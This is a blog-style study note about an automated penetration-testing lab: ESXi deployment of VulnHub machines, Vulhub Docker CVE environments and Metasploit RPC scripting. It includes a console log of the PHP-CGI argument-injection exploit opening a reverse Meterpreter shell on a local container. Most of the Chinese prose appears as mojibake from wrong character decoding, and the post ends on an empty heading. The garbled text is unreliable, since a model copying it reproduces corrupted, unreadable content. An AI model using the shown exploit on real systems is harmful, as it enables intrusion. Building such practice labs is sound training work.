---
title: è‡ªåŠ¨åŒ–æ¸—é€æµ‹è¯•ç¯å¢ƒ
tags: [vmware,Penetration]
date: 2024-07-02 19:24:00
categories: [å­¦ä¹ ç¬”è®°]
excerpt: 1. ç”¨EXSiè‡ªåŠ¨åŒ–éƒ¨ç½²vulnhubçš„è™šæ‹Ÿæœº ; 2. ç”¨dockeræ¨¡æ‹Ÿgithubä¸Švulhubçš„CVE
---

ä»¥ä¸‹å†…å®¹å¯¹åº”ä»“åº“

https://github.com/Isolator-1/AutoPT-test-

åœ¨`https://www.vulnhub.com/`ä¸Šçš„åŸºæœ¬ä¸Šéƒ½æ˜¯ä¸€äº›ovaè™šæ‹Ÿæœºï¼ˆä¹Ÿæœ‰ä¸€äº›isoé•œåƒï¼‰ï¼Œè€Œåœ¨`https://github.com/vulhub/vulhub/tree/master`ä¸Šéƒ½æ˜¯ä¸€äº›dockerã€‚å‰è€…ä½¿ç”¨ESXiæ¥ç®¡ç†æ§åˆ¶ã€‚

è¿™ä¸¤è€…çš„åŒºåˆ«åœ¨äºï¼Œå‰è€…ç¯å¢ƒæ•°é‡æ›´å¤šï¼Œä½†æ˜¯ä¸çŸ¥é“æ¼æ´æ˜¯å•¥ï¼›åè€…æ•°é‡æ²¡é‚£ä¹ˆå¤šï¼Œä½†æ˜¯éƒ½çŸ¥é“CVEæ˜¯ä»€ä¹ˆï¼Œç›´æ¥å»metasploité‡ŒæŸ¥å°±è¡Œäº†ã€‚





## vmware ESXi

å¯¹åº”ä»£ç `VmManage.py`



ESXiæ˜¯ä¸€ä¸ªå¯ä»¥ç®¡ç†å¤šä¸ªè™šæ‹Ÿæœºçš„hostï¼Œæ˜¯ä¸€ä¸ªOSï¼Œå¯ä»¥ç›´æ¥è£…ç‰©ç†æœºç¡¬ä»¶ä¸Šï¼Œä½†è¿™é‡Œè¿˜æ˜¯è£…åœ¨WorkStationé‡Œ

vmware çš„å®˜æ–¹  [æ–‡æ¡£](https://docs.vmware.com/cn/VMware-vSphere/7.0/com.vmware.esxi.install.doc/GUID-016E39C1-E8DB-486A-A235-55CAB242C351.html)ï¼Œä½†æ˜¯åœ¨ä¸‹è½½ESXiçš„åœ°æ–¹ï¼Œvmwareå®˜ç½‘ç°åœ¨å¥½åƒä¸èƒ½ç›´æ¥ä¸‹è½½äº†ï¼Œï¼ˆæ‡’å¾—çœ‹å…·ä½“å•¥æƒ…å†µäº†ï¼Œç›´æ¥æ‰¾äº†ä¸ªåˆ«äººåˆ†äº«çš„  [é“¾æ¥](https://pan.baidu.com/s/1TR1HdluM4u36cArjSyKMYw)ï¼‰

å®‰è£…è¿‡ç¨‹ç•¥ï¼Œå’Œæ™®é€šè™šæ‹Ÿæœºä¸€æ ·ï¼Œä¼šæœ‰ä¸ªè®¾ç½®å¯†ç çš„è¿‡ç¨‹ï¼Œè™šæ‹Ÿæœºåˆ›å»ºå®Œï¼Œå¯ä»¥é€šè¿‡webè®¿é—®åˆ°ï¼Œç”¨æˆ·åæ˜¯rootï¼Œå¯†ç å°±æ˜¯ä¹‹å‰è®¾ç½®çš„ã€‚

![](/img/å­¦ä¹ ç¬”è®°/ESXi/1.jpg)

åœ¨å®‰è£…æ—¶ï¼Œè¦å‹¾é€‰cpué‡Œçš„Intel VT-x EPT...é€‰é¡¹

> è¿™ä¸ªé—®é¢˜ä¼¼ä¹å¾ˆç„ä¹ï¼Œæˆ‘è§£é‡Šä¸æ¸…ã€‚å’Œâ€œå¯ç”¨å…³é—­windowsåŠŸèƒ½â€é‡Œwslã€hypervã€è™šæ‹Ÿæœºå¹³å°é‚£å‡ ä¸ªå–æ¶ˆå‹¾é€‰æœ‰å…³ï¼Œä¹Ÿå’Œå®¶åº­ç‰ˆwindowsæœ‰å…³ï¼ˆå®¶åº­ç‰ˆæ²¡æœ‰hypervç­‰å‡ ä¸ªé€‰é¡¹ï¼Œè™½ç„¶æœ‰ä¸ªè„šæœ¬å¯ä»¥è°ƒå‡ºæ¥ï¼Œä½†æˆ‘ä¹Ÿä¸çŸ¥é“å®é™…æœ‰æ²¡æœ‰ç”¨ï¼‰
>
> ç®¡ç†å‘˜æ‰§è¡Œ bcdedit /set hypervisorlaunchtype off ï¼Œè¿™é‡Œæˆ‘çš„ç”µè„‘å¥½äº†ï¼Œä½†ä¼¼ä¹ç½‘ä¸Šè¯´å¦‚æœè§£å†³ä¸äº†è¿˜æœ‰åç»­ğŸ˜¶â€ğŸŒ«ï¸
>
> ä¸ç®¡äº†

##### åˆ†é…IPåœ°å€è¸©çš„å‘

ä¸€å¼€å§‹æ˜¾ç¤ºçš„ipæ˜¯èƒ½ç”¨çš„ï¼Œä½†æ˜¯é‡å¯ä¸€æ¬¡å‘ç°ï¼Œdhcpåˆ†é…å‡ºæ¥ä¸€ä¸ªå¾ˆå¥‡æ€ªçš„ipï¼ˆä¸æ˜¯è‡ªå·±çš„å­ç½‘å†…çš„ipï¼Œæ˜¯ä¸€ä¸ª169å¼€å¤´çš„ï¼Œä¸æ˜¯192å¼€å¤´çš„ï¼Œå¾ˆå¥‡æ€ªä¸ç†è§£ï¼‰ï¼Œç„¶åè¯•äº†host onlyï¼ŒNATï¼Œæ¡¥æ¥ï¼Œdhcpå‡ºæ¥çš„éƒ½æ˜¯é‚£ä¸ª169å¼€å¤´çš„ğŸ˜µâ€ğŸ’«ğŸ˜µâ€ğŸ’«ğŸ˜µâ€ğŸ’«åœ¨è®¾ç½®é‡Œå¯ç”¨shell, alt F1è¿›å…¥shellï¼Œä¹Ÿçœ‹ä¸äº†ç½‘å¡

æ‰€ä»¥é€šè¿‡`Restart System Configuration`é‡ç½®äº†ä¸€ä¸‹ï¼Œå‘ç°IPèƒ½æ­£ç¡®åˆ†é…äº†

ğŸ˜­ğŸ˜­ğŸ˜­ğŸ˜­ğŸ˜­

ï¼ˆè¿™æ—¶çš„å¯†ç ä¼šå˜æˆç©ºï¼Œç”¨æˆ·åè¿˜æ˜¯rootï¼‰

##### åç»­éƒ¨åˆ†å‚è€ƒè‡ª

https://github.com/vmware/pyvmomi-community-samples/tree/master

è¿™æ˜¯ä¸€äº›åŸºäºpyvmomiçš„åŸå­æ“ä½œä¸Šå†™çš„ä¸€äº›å·¥å…·

### é€šè¿‡ä»£ç è¿æ¥ESXi

```bash
pip install pyVim==0.0.21  
pip install pyvmomi==6.7.1
```

å¯¹åº”ä»“åº“ä¸­`class VmManage . __init__`

è¿™é‡Œè¦æ³¨æ„çš„æ˜¯ï¼Œè™½ç„¶ä»£ç åªå¼•ç”¨äº†`pyvim`ï¼Œä½†å¦‚æœåªå®‰è£…`pyvim`ï¼Œè¿™ä¸ªåº“ä¼šå°‘å¾ˆå¤šä¸œè¥¿ï¼Œæ¯”å¦‚æ²¡æœ‰`SmartConnectNoSSL`ï¼Œåªæœ‰`SmartConnect`ï¼Œç„¶åé“¾æ¥çš„æ—¶å€™å°±éœ€è¦è¯ä¹¦ï¼Œæ‰€ä»¥`pyvmomi`æ˜¯å¿…é¡»è¦è£…çš„

### å¯¼å…¥ova

å› ä¸ºå½“æ—¶çš„éœ€æ±‚æ˜¯è¦è‡ªåŠ¨å®‰è£…ä»vulnhubä¸‹è½½çš„ç¯å¢ƒï¼Œå¤§éƒ¨åˆ†éƒ½æ˜¯isoå’Œova

> åœ¨æºé¡¹ç›®deploy_ova.pyä¸­ï¼Œupload_diskéœ€è¦æ”¹ä¸€ä¸‹ï¼Œå¦åˆ™æ— æ³•ä¸Šä¼ å¸¦isoæ–‡ä»¶çš„ovaï¼Œè§issueï¼šhttps://github.com/vmware/pyvmomi-community-samples/issues/392

### å…¶ä»–æ“ä½œ

å¼€æœºå…³æœºï¼Œåˆ é™¤è™šæ‹Ÿæœºè¿™äº›å°±æ²¡å•¥ç‰¹åˆ«çš„äº†ï¼Œå…¨éƒ½å‚è€ƒè‡ªé‚£ä¸ªcommunity samples





## Docker

å¯¹åº”ä»£ç `DockerManager.py`



ç›´æ¥çœ‹`https://github.com/vulhub/vulhub/tree/master`çš„è¯´æ˜å°±è¡Œï¼Œä¸å¤šåšèµ˜è¿°

è¿™ä¸ªåº“é‡Œå­˜äº†ä¸€å †`docker-compose.yml`ï¼Œç”¨å“ªä¸ªå°±åˆ›å»ºå“ªä¸ªå°±è¡Œäº†

æ¯”å¦‚`php/CVE-2012-1823`

ç›´æ¥åœ¨è¿™ä¸ªç›®å½•ä¸‹ç”¨`docker-compose up -d`ï¼Œç„¶åå°±å¯ä»¥é€šè¿‡å®¹å™¨æ˜ å°„çš„ç«¯å£è®¿é—®åˆ°äº†

```
msf6 exploit(multi/http/php_cgi_arg_injection) > run

[*] Started reverse TCP handler on 192.168.71.131:4444 
[*] Sending stage (39927 bytes) to 172.20.0.2
[*] Meterpreter session 1 opened (192.168.71.131:4444 -> 172.20.0.2:38974) at 2024-07-09 13:14:20 -0400

meterpreter > shell
Process 78 created.
Channel 0 created.

ls
index.php
info.php
```

`docker compose down -v` åˆ é™¤ç¯å¢ƒ

> docker æ¢æºæ—¶ï¼Œé˜¿é‡Œäº‘çš„æºéœ€è¦æœ‰ä¸€ä¸ªè‡ªå·±çš„åŠ é€Ÿå™¨åœ°å€ï¼Œå½¢å¦‚ https://<???>.mirror.aliyuncs.comï¼Œåœ¨è¿™é‡Œç”³è¯·ï¼šhttps://cr.console.aliyun.com/cn-hangzhou/instances/mirrors

##### åœ¨ä»£ç ä¸­æ§åˆ¶è¿™äº›docker

ç”±äºdocker composeæ˜¯ä¸€ä¸ª"CLI tool"ï¼Œåœ¨dockerçš„APIä¸­å¹¶æ²¡æœ‰ä¸ä¹‹ç›¸å…³çš„å†…å®¹

å³æˆ‘æ²¡åŠæ³•docker-composeä¹‹åï¼Œç›´æ¥æ‹¿åˆ°ç”±å®ƒåˆ›å»ºå‡ºæ¥çš„å®¹å™¨

æ‰€ä»¥åªèƒ½åœ¨ymlä¸­è§£æå‡ºé•œåƒçš„åå­—ï¼Œç„¶ååœ¨å·²ç»è¢«åˆ›å»ºçš„å®¹å™¨ä¸­æŒ‰ç…§é•œåƒåæ£€ç´¢ğŸ˜¥

å¯¹åº” `DockerManager.py` çš„ `parse_yml` `get_container_by_images`

>  çªç„¶è®¿é—®ä¸åˆ°containerï¼Ÿ
>
>  é‡åˆ°è¿‡æœ¬æ¥å¥½å¥½çš„çªç„¶å°±è®¿é—®ä¸åˆ°webçš„æƒ…å†µï¼Œä¸»æœº `service docker restart` å°±å¥½äº†ï¼Œä¸çŸ¥é“ä¸ºå•¥



## æŒ‡å®šcveï¼Œé€šè¿‡metasploitæ”»å‡»

å¯¹åº”ä»£ç `metasploit.py`ï¼Œè¿™éƒ¨åˆ†ä»£ç æŠ„è‡ªDeepExploit

è¸©è¿‡çš„å‘ï¼š

console.writeæ—¶ï¼Œå‘½ä»¤è¦å¸¦ä¸Šæ¢è¡Œç¬¦\nï¼Œæ–‡æ¡£åŸè¯æ˜¯ï¼šThe console.write method will send data to a specific console, just as if it had been typed by a normal user. This means that most commands will need a newline included at the end for the console to process them properly.ï¼ˆhttps://help.rapid7.com/metasploit/Content/api/rpc/standard-reference.html?Highlight=consoleï¼‰

å°±æ˜¯è¿™ä¸ªæ¢è¡Œæµ‹è¯•çš„æ—¶å€™æ²¡åŠ ï¼Œå¯¼è‡´å‘½ä»¤æ€ä¹ˆéƒ½æ‰§è¡Œä¸æˆåŠŸï¼Œè°ƒè¯•äº†ä¸€ä¸‹åˆä¹Ÿä¸çŸ¥é“é—®é¢˜å‡ºåœ¨å“ªé‡ŒğŸ˜¥ğŸ˜¥



## æ— CVE

